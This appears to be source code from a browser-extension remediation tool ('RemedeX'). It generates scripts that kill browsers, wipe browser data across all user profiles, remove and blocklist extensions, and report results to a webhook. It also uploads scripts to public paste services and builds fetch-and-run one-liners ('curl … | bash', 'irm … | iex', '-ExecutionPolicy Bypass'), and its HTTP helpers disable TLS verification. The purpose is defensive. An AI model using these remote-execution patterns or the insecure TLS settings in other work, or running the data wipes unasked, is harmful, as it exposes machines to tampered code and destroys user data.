    for proc in "Google Chrome" "Google Chrome Helper" "Chromium" "Brave Browser" "Microsoft Edge"; do
        if killall "$proc" 2>/dev/null; then
            log "  Stopped $proc"
            CLOSED_BROWSERS="$CLOSED_BROWSERS $proc"
        fi
    done
else
    for proc in chrome chromium google-chrome google-chrome-stable brave brave-browser msedge microsoft-edge; do
        if pkill -x "$proc" 2>/dev/null; then
            log "  Stopped $proc"
            CLOSED_BROWSERS="$CLOSED_BROWSERS $proc"
        fi
    done
fi
if [[ -z "$CLOSED_BROWSERS" ]]; then
    log "  No browser processes were running"
else
    sleep 3
    # SIGKILL any remaining browser processes
    if [[ "$OS" == "mac" ]]; then
        for proc in "Google Chrome" "Chromium" "Brave Browser" "Microsoft Edge"; do
            killall -9 "$proc" 2>/dev/null
        done
    else
        for proc in chrome chromium google-chrome google-chrome-stable brave brave-browser msedge microsoft-edge; do
            pkill -9 -x "$proc" 2>/dev/null
        done
    fi
    sleep 1
fi

# Step 2: Discover all user home directories and browser paths
OLD_IFS="$IFS"
IFS=$'\n'
USER_HOMES=($(discover_home_dirs))
IFS="$OLD_IFS"
log "Discovered ${#USER_HOMES[@]} user profile(s): $(for h in "${USER_HOMES[@]}"; do basename "$h"; done | tr '\n' ' ')"

FOUND_BROWSERS=""
CLEAN_RESULTS=""

for home in "${USER_HOMES[@]}"; do
    username=$(basename "$home")
    for browser in chrome edge brave; do
        bpath=$(get_browser_paths_for_home "$home" "$browser")
        if [[ -d "$bpath" ]]; then
            [[ "$FOUND_BROWSERS" != *"$browser"* ]] && FOUND_BROWSERS="$FOUND_BROWSERS $browser"
            log "  Found $browser for $username at: $bpath"
        fi
    done
done

if [[ -z "$TARGET_BROWSERS" ]]; then
    TARGET_BROWSERS="$FOUND_BROWSERS"
fi

log "Found browsers:$FOUND_BROWSERS"

if [[ -z "$FOUND_BROWSERS" ]] && [[ -n "$TARGET_BROWSERS" ]]; then
    log "WARN: Pre-configured target browsers ($TARGET_BROWSERS) but none found on disk. Scanning anyway..."
fi

if [[ -z "$TARGET_BROWSERS" ]]; then
    log "ERROR: No target browsers found across any user profile"
    exit 1
fi

# Step 3: Disable sync BEFORE removal to prevent re-installation
# Always disable sync when removing extensions, regardless of user setting
if $DISABLE_SYNC || [[ ${#REMOVE_EXTENSIONS[@]} -gt 0 ]]; then
    echo ""
    disable_all_sync
fi

# Step 4: Remove specified extensions across all user profiles
if [[ ${#REMOVE_EXTENSIONS[@]} -gt 0 ]]; then
    log "Removing specified extensions..."
    for ext_id in "${REMOVE_EXTENSIONS[@]}"; do
        log "Removing extension: $ext_id"
        for home in "${USER_HOMES[@]}"; do
            for browser in chrome edge brave; do
                [[ "$TARGET_BROWSERS" != *"$browser"* ]] && continue
                bpath=$(get_browser_paths_for_home "$home" "$browser")
                [[ -d "$bpath" ]] && remove_chromium_extensions "$browser" "$bpath" "$ext_id"
            done
        done
    done
fi

# Step 5: Clean browser data across all user profiles
for home in "${USER_HOMES[@]}"; do
    username=$(basename "$home")
    for browser in chrome edge brave; do
        [[ "$TARGET_BROWSERS" != *"$browser"* ]] && continue
        bpath=$(get_browser_paths_for_home "$home" "$browser")
        if [[ -d "$bpath" ]]; then
            log "Cleaning $browser for user: $username"
            browser_cap="$(echo "$browser" | awk '{print toupper(substr($0,1,1)) substr($0,2)}')"
            clean_chromium_browser "$browser_cap" "$bpath"
            CLEAN_RESULTS="$CLEAN_RESULTS ${browser}/${username}"
        fi
    done
done

echo ""
log "Cleanup complete!"

# Write summary footer to log
{
    echo
    printf '%70s\n' '' | tr ' ' '='
    echo "  SUMMARY"
    printf '%70s\n' '' | tr ' ' '='
    echo "  Finished:  $(date '+%Y-%m-%d %H:%M:%S')"
    echo "  Browsers:  $TARGET_BROWSERS"
    echo "  Users:     ${USER_HOMES[*]}"
    echo "  Cookies:   $($INCLUDE_COOKIES && echo 'Cleared' || echo 'Skipped')"
    echo "  Closed:    $CLOSED_BROWSERS"
    echo "  Cleaned:   $CLEAN_RESULTS"
    if [[ ${#REMOVE_EXTENSIONS[@]} -gt 0 ]]; then
        echo "  Extensions removed: ${REMOVE_EXTENSIONS[*]}"
    fi
    if $DISABLE_SYNC; then
        echo "  Sync:      Disabled via enterprise policy"
    fi
    printf '%70s\n' '' | tr ' ' '='
    echo
    echo "  TROUBLESHOOTING"
    printf '%70s\n' '' | tr ' ' '-'
    echo "  - If cleanup failed: ensure browsers are closed before running."
    echo "  - If extension keeps returning: verify the policy was applied."
    echo "  - macOS: run 'defaults read com.google.Chrome ExtensionInstallBlocklist'"
    echo "  - Linux: check /etc/opt/chrome/policies/managed/ for policy JSON files."
    echo "  - To verify in browser: open chrome://policy."
    echo "  - To undo blocklist: use RemedeX GUI > Manage Blocklist > Unblock."
    printf '%70s\n' '' | tr ' ' '='
} >> "$LOG_FILE"

echo ""
log "Full log saved to: $LOG_FILE"

# Completion webhook is sent automatically via the EXIT trap
'''
        script = script.replace("{disable_sync_val}", disable_sync_val)
        script = script.replace("{clean_prefs_val}", clean_prefs_val)
        script = script.replace("{apply_blocklist_val}", apply_blocklist_val)
        script = script.replace("{webhook_url}", webhook_url_val)
        return script
    
    def _generate_python_cleanup_script(self, disable_sync: bool = False, clean_preferences: bool = False, webhook_url: str = "", apply_blocklist: bool = True) -> str:
        """Generate standalone Python cleanup script for cross-platform remote use"""
        disable_sync_val = "True" if disable_sync else "False"
        clean_prefs_val = "True" if clean_preferences else "False"
        apply_blocklist_val = "True" if apply_blocklist else "False"
        webhook_url_val = webhook_url if webhook_url else ""
        script = '''#!/usr/bin/env python3
"""
Browser Data Cleanup Script - Clears ALL browser data and removes extensions

This standalone script can be run remotely via SSH, PSRemoting, or any remote
execution tool. It requires no dependencies beyond Python 3.6+.

Usage:
    python browser_cleanup.py                              # Clean all browsers
    python browser_cleanup.py --cookies                    # Also clear cookies
    python browser_cleanup.py --disable-sync               # Disable extension sync
    python browser_cleanup.py --browsers chrome            # Clean specific browser
    python browser_cleanup.py --force                      # Skip confirmations
    python browser_cleanup.py --remove-ext EXTENSION_ID    # Remove specific extension
"""

import os
import sys
import shutil
import platform
import argparse
import tempfile
from pathlib import Path
from datetime import datetime

if platform.system() == "Windows" and os.path.isdir("C:\\\\Windows\\\\Temp"):
    _tmp = "C:\\\\Windows\\\\Temp"
else:
    _tmp = tempfile.gettempdir()
LOG_FILE = os.path.join(_tmp, f"remedex_cleanup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
_log_fh = open(LOG_FILE, "w", encoding="utf-8")
WEBHOOK_URL = "{webhook_url}"

def send_webhook(data):
    if not WEBHOOK_URL:
        return
    try:
        import urllib.request, json as _j
        payload = _j.dumps(data).encode()
        req = urllib.request.Request(WEBHOOK_URL, data=payload,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    colors = {"ERROR": "\\033[91m", "WARN": "\\033[93m", "SUCCESS": "\\033[92m", "INFO": "\\033[0m"}
    reset = "\\033[0m"
    color = colors.get(level, colors["INFO"])
    line = f"[{timestamp}] [{level}] {message}"
    print(f"{color}{line}{reset}")
    _log_fh.write(line + "\\n")
    _log_fh.flush()

def discover_home_dirs():
    system = platform.system()
    homes = []
    skip = {"Public", "Default", "Default User", "All Users", "defaultuser0",
            "Shared", "Guest", "nobody", "daemon", "_www"}
    if system == "Windows":
        users_root = Path("C:/Users")
    elif system == "Darwin":
        users_root = Path("/Users")
    else:
        users_root = Path("/home")
    try:
        for d in users_root.iterdir():
            if d.is_dir() and d.name not in skip:
                homes.append(d)
    except PermissionError:
        pass
    if not homes:
        homes.append(Path.home())
    return homes

def _browser_relative_paths(home, system):
    if system == "Windows":
        local = home / "AppData" / "Local"
        roaming = home / "AppData" / "Roaming"
        return {
            "chrome": local / "Google" / "Chrome" / "User Data",
            "edge": local / "Microsoft" / "Edge" / "User Data",
            "brave": local / "BraveSoftware" / "Brave-Browser" / "User Data",
        }
    elif system == "Darwin":
        return {
            "chrome": home / "Library" / "Application Support" / "Google" / "Chrome",
            "edge": home / "Library" / "Application Support" / "Microsoft Edge",
            "brave": home / "Library" / "Application Support" / "BraveSoftware" / "Brave-Browser",
        }
    else:
        return {
            "chrome": home / ".config" / "google-chrome",
            "edge": home / ".config" / "microsoft-edge",
            "brave": home / ".config" / "BraveSoftware" / "Brave-Browser",
        }

def get_all_browser_paths():
    """Discover browser paths across ALL user profiles on the machine."""
    system = platform.system()
    homes = discover_home_dirs()
    log(f"Discovered {len(homes)} user profile(s): {[h.name for h in homes]}")
    result = {}
    for home in homes:
        rel = _browser_relative_paths(home, system)
        for browser, path in rel.items():
            try:
                if path.exists():
                    result.setdefault(browser, []).append(path)
            except PermissionError:
                pass
    return result

def clean_chromium_browser(name, base_path, include_cookies=False):
    log(f"Cleaning {name}...")
    
    profiles = ["Default"]
    profiles.extend([d.name for d in base_path.iterdir() if d.is_dir() and d.name.startswith("Profile")])
    
    for profile_name in profiles:
        profile = base_path / profile_name
        if not profile.exists():
            continue
        
        log(f"  Processing profile: {profile_name}")
        
        # Directories to clear
        clear_dirs = [
            profile / "Local Storage" / "leveldb",
            profile / "Session Storage",
            profile / "Cache" / "Cache_Data",
            profile / "Service Worker",
            profile / "IndexedDB",
        ]
        
        for dir_path in clear_dirs:
            if dir_path.exists():
                try:
                    shutil.rmtree(dir_path)
                    dir_path.mkdir(parents=True, exist_ok=True)
                    log(f"    Cleared {dir_path.name}")
                except Exception as e:
                    log(f"    Failed to clear {dir_path.name}: {e}", "WARN")
        
        if include_cookies:
            cookies = profile / "Network" / "Cookies"
            if cookies.exists():
                try:
                    cookies.unlink()
                    log("    Cleared Cookies")
                except Exception as e:
                    log(f"    Failed to clear cookies: {e}", "WARN")
    
    log(f"{name} cleanup complete", "SUCCESS")

BROWSER_POLICY_MAC_DOMAIN = {
    "chrome": "com.google.Chrome",
    "edge": "com.microsoft.Edge",
    "brave": "com.brave.Browser",
}
BROWSER_POLICY_LINUX_DIR = {
    "chrome": "/etc/opt/chrome/policies/managed",
    "edge": "/etc/opt/edge/policies/managed",
    "brave": "/etc/brave/policies/managed",
}

def add_extension_to_blocklist(browser, extension_id):
    """Block an extension via enterprise policy (OS-level, survives sync)"""
    import subprocess, json as _json
    
    if sys.platform == "darwin":
        domain = BROWSER_POLICY_MAC_DOMAIN.get(browser)
        if not domain:
            return
        subprocess.run(["defaults", "write", domain,
                        "ExtensionInstallBlocklist", "-array-add", extension_id],
                       capture_output=True)
        log(f"  Added {extension_id} to {domain} policy blocklist", "SUCCESS")
    else:
        policy_dir = Path(BROWSER_POLICY_LINUX_DIR.get(browser, ""))
        if not str(policy_dir):
            return
        policy_dir.mkdir(parents=True, exist_ok=True)
        policy_file = policy_dir / "remedex_blocklist.json"
        policy = {}
        if policy_file.exists():
            try:
                with open(policy_file, "r") as f:
                    policy = _json.load(f)
            except Exception:
                pass
        bl = policy.get("ExtensionInstallBlocklist", [])
        if extension_id not in bl:
            bl.append(extension_id)
            policy["ExtensionInstallBlocklist"] = bl
            with open(policy_file, "w") as f:
                _json.dump(policy, f, indent=2)
        log(f"  Added {extension_id} to policy blocklist: {policy_file}", "SUCCESS")

def disable_all_extension_sync(targets):
    """Disable extension sync entirely via enterprise policy"""
    import subprocess, json as _json
    
    log("Disabling extension sync via enterprise policies...")
    for browser in targets:
        if sys.platform == "darwin":
            domain = BROWSER_POLICY_MAC_DOMAIN.get(browser)
            if not domain:
                continue
            subprocess.run(["defaults", "write", domain,
                            "SyncDisabled", "-bool", "true"], capture_output=True)
            log(f"  Disabled sync for {browser} via macOS managed preferences", "SUCCESS")
        else:
            policy_dir = Path(BROWSER_POLICY_LINUX_DIR.get(browser, ""))
            if not str(policy_dir):
                continue
            policy_dir.mkdir(parents=True, exist_ok=True)
            policy_file = policy_dir / "remedex_sync.json"
            with open(policy_file, "w") as f:
                _json.dump({"SyncDisabled": True}, f, indent=2)
            log(f"  Disabled sync for {browser} via policy file: {policy_file}", "SUCCESS")

def remove_extension_from_preferences(base_path, extension_id):
    """Remove extension entry from Preferences and Secure Preferences files"""
    import json as _json
    profiles = ["Default"]
    try:
        profiles.extend([d.name for d in base_path.iterdir() if d.is_dir() and d.name.startswith("Profile")])
    except Exception:
        pass
    for profile_name in profiles:
        profile = base_path / profile_name
        if not profile.exists():
            continue
        for prefs_name in ["Preferences", "Secure Preferences"]:
            prefs_path = profile / prefs_name
            if not prefs_path.exists():
                continue
            try:
                with open(prefs_path, "r", encoding="utf-8") as f:
                    prefs = _json.load(f)
                settings = prefs.get("extensions", {}).get("settings", {})
                if extension_id in settings:
                    del settings[extension_id]
                    with open(prefs_path, "w", encoding="utf-8") as f:
                        _json.dump(prefs, f, separators=(",", ":"))
                    log(f"    Removed {extension_id} from {profile_name}/{prefs_name}", "SUCCESS")
            except Exception as e:
                log(f"    Could not clean {profile_name}/{prefs_name}: {e}", "WARN")

CLEAN_PREFERENCES = {clean_prefs_val}
APPLY_BLOCKLIST = {apply_blocklist_val}

def remove_extension(all_browser_paths, extension_id):
    """Remove a specific extension by ID across all users and block it from re-syncing"""
    log(f"Looking for extension: {extension_id}")
    found = False
    results = []
    ext_subdirs = ["Extensions", "Local Extension Settings", "Managed Extension Settings",
                   "Sync Extension Settings", "Extension Rules", "Extension Scripts"]
    
    for browser, path_list in all_browser_paths.items():
        for base_path in path_list:
            profiles = ["Default"]
            try:
                profiles.extend([d.name for d in base_path.iterdir() if d.is_dir() and d.name.startswith("Profile")])
            except Exception:
                pass
            for profile_name in profiles:
                profile_dir = base_path / profile_name
                for subdir in ext_subdirs:
                    ext_path = profile_dir / subdir / extension_id
                    if ext_path.exists():
                        try:
                            shutil.rmtree(ext_path)
                            log(f"Removed {extension_id} from {profile_name}/{subdir}", "SUCCESS")
                            found = True
                        except Exception as e:
                            log(f"Failed to remove from {profile_name}/{subdir}: {e}", "ERROR")
                # Clean extension-specific IndexedDB entries
                idb_dir = profile_dir / "IndexedDB"
                if idb_dir.exists():
                    try:
                        for item in idb_dir.iterdir():
                            if extension_id in item.name:
                                shutil.rmtree(item) if item.is_dir() else item.unlink()
                                log(f"Removed IndexedDB for {extension_id} from {profile_name}", "SUCCESS")
                    except Exception:
                        pass
            # Always clean preferences to prevent Chrome from re-installing
            log(f"  Cleaning extension from preferences files...")
            remove_extension_from_preferences(base_path, extension_id)
            # Apply blocklist if enabled
            if APPLY_BLOCKLIST:
                add_extension_to_blocklist(browser, extension_id)
            if found:
                results.append(f"{browser}: removed from {base_path}")
    
    if not found:
        log(f"Extension {extension_id} not found in any browser/user", "WARN")
        results.append(f"NOT FOUND: {extension_id}")
    return results

def main():
    parser = argparse.ArgumentParser(description="Browser Data Cleanup Script")
    parser.add_argument("--cookies", action="store_true", help="Also clear cookies")
    parser.add_argument("--disable-sync", action="store_true", default={disable_sync_val},
                       dest="disable_sync", help="Disable extension sync in all Chromium profiles")
    parser.add_argument("--browsers", nargs="+", help="Specific browsers to clean")
    parser.add_argument("--force", "-f", action="store_true", help="Skip confirmations")
    parser.add_argument("--remove-ext", action="append", dest="remove_extensions",
                       help="Extension ID to remove (can be used multiple times)")
    args = parser.parse_args()
    
    import socket, subprocess

    print()
    print("=" * 50)
    print("  Browser Data Cleanup Script")
    print("  Clears ALL browser data from ALL websites")
    print("=" * 50)
    print()
    
    # Write log header
    _log_fh.write("=" * 70 + "\\n")
    _log_fh.write("  RemedeX Browser Cleanup - Execution Log\\n")
    _log_fh.write(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
    _log_fh.write(f"  Host:    {socket.gethostname()} ({os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))})\\n")
    _log_fh.write(f"  OS:      {platform.platform()}\\n")
    _log_fh.write("=" * 70 + "\\n\\n")
    _log_fh.flush()
    
    log(f"Log file: {LOG_FILE}")

    # Send start webhook
    send_webhook({
        "event": "remedex_cleanup_started",
        "host": socket.gethostname(),
        "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
        "os": platform.platform(),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "log_file": LOG_FILE,
    })

    status = "success"
    error_msg = ""
    closed_browsers = []
    targets = {}
    ext_results = []
    clean_results = []

    try:
        # Step 1: Force-close ALL browser processes unconditionally
        log("Force-closing all browser processes...")
        if sys.platform == "win32":
            for name, proc in [("Chrome","chrome"), ("Edge","msedge"), ("Brave","brave")]:
                try:
                    r = subprocess.run(["taskkill", "/F", "/IM", f"{proc}.exe"],
                                       capture_output=True, text=True)
                    if r.returncode == 0:
                        log(f"  Stopped {name}", "SUCCESS")
                        closed_browsers.append(name)
                except Exception:
                    pass
        else:
            if sys.platform == "darwin":
                for proc in ["Google Chrome", "Google Chrome Helper", "Chromium", "Brave Browser", "Microsoft Edge"]:
                    try:
                        r = subprocess.run(["killall", proc], capture_output=True)
                        if r.returncode == 0:
                            log(f"  Stopped {proc}", "SUCCESS")
                            closed_browsers.append(proc)
                    except Exception:
                        pass
            else:
                for proc in ["chrome", "chromium", "google-chrome", "google-chrome-stable", "brave", "brave-browser", "msedge", "microsoft-edge"]:
                    try:
                        r = subprocess.run(["pkill", "-x", proc], capture_output=True)
                        if r.returncode == 0:
                            log(f"  Stopped {proc}", "SUCCESS")
                            closed_browsers.append(proc)
                    except Exception:
                        pass
        if not closed_browsers:
            log("  No browser processes were running")
        else:
            import time; time.sleep(3)
            if sys.platform == "darwin":
                for proc in ["Google Chrome", "Chromium", "Brave Browser", "Microsoft Edge"]:
                    try: subprocess.run(["killall", "-9", proc], capture_output=True)
                    except Exception: pass
            else:
                for proc in ["chrome", "chromium", "google-chrome", "google-chrome-stable", "brave", "brave-browser", "msedge", "microsoft-edge"]:
                    try: subprocess.run(["pkill", "-9", "-x", proc], capture_output=True)
                    except Exception: pass
            time.sleep(1)

        # Step 2: Discover browser paths across ALL user profiles
        all_browser_paths = get_all_browser_paths()
        targets = dict(all_browser_paths)
        
        if args.browsers:
            targets = {b: p for b, p in targets.items() if b in args.browsers}
        
        log(f"Found browsers: {', '.join(targets.keys()) if targets else 'none'}")
        
        if not targets:
            log("No target browsers found across any user profile", "ERROR")
            status = "failed"
            error_msg = "No browsers found in any user profile"
        else:
            # Step 3: Disable sync BEFORE removal to prevent re-installation
            if args.disable_sync or args.remove_extensions:
                print()
                try:
                    disable_all_extension_sync(targets)
                except Exception as e:
                    log(f"Error disabling sync: {e}", "ERROR")

            # Step 4: Remove specified extensions across all user profiles
            if args.remove_extensions:
                print()
                log("Removing specified extensions...")
                for ext_id in args.remove_extensions:
                    try:
                        ext_results.extend(remove_extension(targets, ext_id))
                    except Exception as e:
                        log(f"Error removing {ext_id}: {e}", "ERROR")
                        ext_results.append(f"FAILED:{ext_id}:{e}")
            
            # Step 5: Clean browser data across all user profiles
            for browser, path_list in targets.items():
                for bpath in path_list:
                    user_dir = bpath.parts[2] if len(bpath.parts) > 2 else "unknown"
                    try:
                        log(f"Cleaning {browser} for user: {user_dir}")
                        clean_chromium_browser(browser.capitalize(), bpath, args.cookies)
                        clean_results.append(f"{browser}/{user_dir}")
                    except Exception as e:
                        log(f"Error cleaning {browser}/{user_dir}: {e}", "ERROR")
                        clean_results.append(f"{browser}/{user_dir}:FAILED")
            
            print()
            log("Cleanup complete!", "SUCCESS")

    except Exception as e:
        status = "failed"
        error_msg = str(e)
        log(f"Script failed with error: {e}", "ERROR")
        import traceback
        log(traceback.format_exc(), "ERROR")

    finally:
        # Write summary footer
        try:
            homes = discover_home_dirs()
            _log_fh.write("\\n" + "=" * 70 + "\\n")
            _log_fh.write("  SUMMARY\\n")
            _log_fh.write("=" * 70 + "\\n")
            _log_fh.write(f"  Finished:  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
            _log_fh.write(f"  Status:    {status}\\n")
            if error_msg:
                _log_fh.write(f"  Error:     {error_msg}\\n")
            _log_fh.write(f"  Browsers:  {', '.join(targets.keys()) if targets else 'none'}\\n")
            _log_fh.write(f"  Users:     {[h.name for h in homes]}\\n")
            _log_fh.write(f"  Cookies:   {'Cleared' if args.cookies else 'Skipped'}\\n")
            _log_fh.write(f"  Closed:    {', '.join(closed_browsers) if closed_browsers else 'none'}\\n")
            _log_fh.write(f"  Cleaned:   {', '.join(clean_results) if clean_results else 'none'}\\n")
            if args.remove_extensions:
                _log_fh.write(f"  Extensions removed: {', '.join(args.remove_extensions)}\\n")
            if args.disable_sync:
                _log_fh.write("  Sync:      Disabled via enterprise policy\\n")
            _log_fh.write("=" * 70 + "\\n\\n")
            _log_fh.write("  TROUBLESHOOTING\\n")
            _log_fh.write("-" * 70 + "\\n")
            _log_fh.write("  - If cleanup failed: ensure browsers are closed before running.\\n")
            _log_fh.write("  - If extension keeps returning: verify the policy was applied.\\n")
            if sys.platform == "win32":
                _log_fh.write("  - Check registry: HKLM\\\\SOFTWARE\\\\Policies\\\\Google\\\\Chrome\\n")
            elif sys.platform == "darwin":
                _log_fh.write("  - Run: defaults read com.google.Chrome ExtensionInstallBlocklist\\n")
            else:
                _log_fh.write("  - Check: /etc/opt/chrome/policies/managed/ for policy JSON files.\\n")
            _log_fh.write("  - To verify in browser: open chrome://policy.\\n")
            _log_fh.write("  - To undo blocklist: use RemedeX GUI > Manage Blocklist > Unblock.\\n")
            _log_fh.write("=" * 70 + "\\n")
            _log_fh.flush()
        except Exception:
            pass

        print()
        log(f"Full log saved to: {LOG_FILE}", "SUCCESS")

        try:
            _log_fh.close()
        except Exception:
            pass

        # ALWAYS send completion webhook
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                log_content = f.read()
            log_tail = log_content[-3000:] if len(log_content) > 3000 else log_content
        except Exception:
            log_tail = "(could not read log)"
        send_webhook({
            "event": "remedex_cleanup_finished",
            "host": socket.gethostname(),
            "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "status": status,
            "error": error_msg,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "browsers_found": list(targets.keys()) if targets else [],
            "browsers_closed": closed_browsers,
            "extensions_results": ext_results,
            "clean_results": clean_results,
            "cookies_cleared": args.cookies,
            "sync_disabled": args.disable_sync,
            "preferences_cleaned": CLEAN_PREFERENCES,
            "log_file": LOG_FILE,
            "log_content": log_tail,
        })

if __name__ == "__main__":
    main()
'''
        script = script.replace("{disable_sync_val}", disable_sync_val)
        script = script.replace("{clean_prefs_val}", clean_prefs_val)
        script = script.replace("{apply_blocklist_val}", apply_blocklist_val)
        script = script.replace("{webhook_url}", webhook_url_val)
        return script

    @staticmethod
    def _curl_post(url: str, data: bytes, content_type: str = "text/plain", timeout: int = 15) -> str:
        """POST data using curl subprocess — uses OS-native SSL, immune to Python SSL/proxy issues."""
        import tempfile
        tmp = tempfile.NamedTemporaryFile(mode='wb', suffix='.tmp', delete=False)
        try:
            tmp.write(data)
            tmp.close()
            curl_bin = "curl.exe" if platform.system() == "Windows" else "curl"
            ssl_flag = "--ssl-no-revoke" if platform.system() == "Windows" else "-k"
            cmd = [curl_bin, "-s", "-S", ssl_flag, "--max-time", str(timeout),
                   "-X", "POST", "-H", f"Content-Type: {content_type}",
                   "--data-binary", f"@{tmp.name}", url]
            print(f"[curl] Running: {' '.join(cmd[:6])}... -> {url}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            print(f"[curl] rc={result.returncode} stdout={result.stdout.strip()[:100]} stderr={result.stderr.strip()[:100]}")
            if result.returncode != 0:
                raise RuntimeError(f"curl exit {result.returncode}: {result.stderr.strip()}")
            return result.stdout
        finally:
            try:
                os.unlink(tmp.name)
            except OSError:
                pass

    @staticmethod
    def _http_post(url: str, data: bytes, content_type: str = "application/x-www-form-urlencoded", timeout: int = 15) -> str:
        """POST data to a URL. Tries curl.exe first (best for corporate proxies), then requests, then urllib."""
        # Prefer curl — uses OS-native SSL, handles corporate proxy certs natively
        curl_bin = "curl.exe" if platform.system() == "Windows" else "curl"
        if shutil.which(curl_bin):
            print(f"[_http_post] Using curl for {url}")
            return BrowserExtensionManager._curl_post(url, data, content_type, timeout)
        print(f"[_http_post] curl not found, using {'requests' if REQUESTS_AVAILABLE else 'urllib'}")
        if REQUESTS_AVAILABLE:
            headers = {"Content-Type": content_type}
            resp = requests.post(url, data=data, headers=headers, timeout=timeout, verify=False)
            resp.raise_for_status()
            return resp.text
        import urllib.request, ssl
        req = urllib.request.Request(url, data=data, headers={"Content-Type": content_type})
        try:
            resp = urllib.request.urlopen(req, timeout=timeout)
        except Exception:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return resp.read().decode()

    @staticmethod
    def upload_script(script_content: str, script_type: str = "python", expiry_days: int = 7) -> Dict[str, str]:
        """Upload a script to a temporary paste service and return URLs + one-liner commands.
        
        Tries paste.rs (primary) then filebin.net (fallback).
        Uses curl.exe for uploads to bypass Python SSL/proxy issues.
        No authentication required; pastes auto-expire.
        
        Returns:
            Dict with keys: url, raw_url, oneliner, oneliner_alt
        """
        errors = []

        # Service 1: paste.rs
        try:
            body = BrowserExtensionManager._http_post(
                "https://paste.rs/", script_content.encode("utf-8"), "text/plain; charset=utf-8")
            paste_url = body.strip()
            if paste_url.startswith("http"):
                return BrowserExtensionManager._build_share_result(paste_url, paste_url, script_type)
            errors.append(f"paste.rs: unexpected response: {paste_url[:120]}")
        except Exception as e:
            errors.append(f"paste.rs: {type(e).__name__}: {e}")

        # Service 2: filebin.net
        try:
            import secrets, string
            ext_map = {"python": "py", "powershell": "ps1", "bash": "sh"}
            bin_id = "remedex-" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12))
            filename = f"cleanup.{ext_map.get(script_type, 'txt')}"
            upload_url = f"https://filebin.net/{bin_id}/{filename}"
            BrowserExtensionManager._http_post(upload_url, script_content.encode("utf-8"), "application/octet-stream")
            page_url = f"https://filebin.net/{bin_id}"
            return BrowserExtensionManager._build_share_result(upload_url, page_url, script_type)
        except Exception as e:
            errors.append(f"filebin.net: {type(e).__name__}: {e}")

        raise RuntimeError("All paste services failed:\n  " + "\n  ".join(errors))

    @staticmethod
    def _build_share_result(raw_url: str, page_url: str, script_type: str) -> Dict[str, str]:
        result = {"url": page_url, "raw_url": raw_url}
        if script_type in ("bash", "sh"):
            result["oneliner"] = f'curl -sL "{raw_url}" | bash'
            result["oneliner_alt"] = f'wget -qO- "{raw_url}" | bash'
        elif script_type in ("powershell", "ps1"):
            result["oneliner"] = f"irm '{raw_url}' | iex"
            result["oneliner_alt"] = f"powershell -ExecutionPolicy Bypass -Command \"irm '{raw_url}' | iex\""
        else:
            result["oneliner"] = f'curl -sL "{raw_url}" | python3 -'
            result["oneliner_alt"] = f'wget -qO- "{raw_url}" | python3 -'
        return result

    def generate_lister_script(self, target_os: str = "windows", webhook_url: str = "",
                               enrich_metadata: bool = False, extract_iocs: bool = False) -> str:
        """Generate a standalone script to list all browser extensions on a target system.
        
        Args:
            target_os: Target operating system - 'windows', 'mac', or 'linux'
            webhook_url: Optional URL to send extension list results to
            enrich_metadata: If True, script also fetches user count + rating from CWS for each extension
            extract_iocs: If True, script extracts network IOCs (domains/IPs) from extension JS files on the remote host
        
        Returns:
            Script string (PowerShell for Windows, Bash for Mac/Linux)
        """
        target_os = target_os.lower()
        if target_os in ("windows", "win"):
            return self._generate_ps_lister_script(webhook_url, enrich_metadata, extract_iocs)
        else:
            return self._generate_bash_lister_script(target_os, webhook_url, enrich_metadata, extract_iocs)

    def _generate_ps_lister_script(self, webhook_url: str = "", enrich_metadata: bool = False, extract_iocs: bool = False) -> str:
        wh_val = webhook_url if webhook_url else ""
        script = r'''# Extension Lister - Run in PowerShell on target Windows machine
# Lists all browser extensions with Name, ID, Version, Status
# Includes unpacked/developer-mode extensions loaded from custom paths
# Works when run as SYSTEM, via remote exec, or as a regular user

function Get-ManifestInfo {
    param([string]$ExtDir)
    $result = @{ Name = ""; Version = "?"; LocaleDir = "" }

    # Try a direct manifest first (unpacked extensions)
    $directManifest = Join-Path $ExtDir "manifest.json"
    if (Test-Path $directManifest) {
        try {
            $mJson = Get-Content $directManifest -Raw -ErrorAction Stop | ConvertFrom-Json
            if ($mJson.name)    { $result.Name    = $mJson.name }
            if ($mJson.version) { $result.Version = $mJson.version }
            $result.LocaleDir = $ExtDir
        } catch {}
        if ($result.Name -and $result.Name -notmatch "^__MSG_") { return $result }
    }

    # Version-subdirectory layout (store extensions: <id>/<version>/manifest.json)
    $versionDirs = Get-ChildItem -Path $ExtDir -Directory -ErrorAction SilentlyContinue | Sort-Object Name -Descending
    foreach ($vDir in $versionDirs) {
        $manifest = Join-Path $vDir.FullName "manifest.json"
        if (Test-Path $manifest) {
            try {
                $mJson = Get-Content $manifest -Raw -ErrorAction Stop | ConvertFrom-Json
                if ($mJson.name)    { $result.Name    = $mJson.name }
                if ($mJson.version) { $result.Version = $mJson.version }
                $result.LocaleDir = $vDir.FullName
            } catch {}
            break
        }
    }

    # Resolve __MSG_keyName__ via _locales
    if ($result.Name -match "^__MSG_(.+)__$") {
        $msgKey = $Matches[1]
        foreach ($locale in @("en","en_US","en_GB","_")) {
            $mFile = Join-Path $result.LocaleDir "_locales\$locale\messages.json"
            if (Test-Path $mFile) {
                try {
                    $msgs = Get-Content $mFile -Raw | ConvertFrom-Json
                    $entry = $msgs.$msgKey
                    if ($entry -and $entry.message) { $result.Name = $entry.message; break }
                } catch {}
            }
        }
    }
    return $result
}

function Get-ExtensionSettings {
    param([string]$ProfilePath)
    $settings = @{}

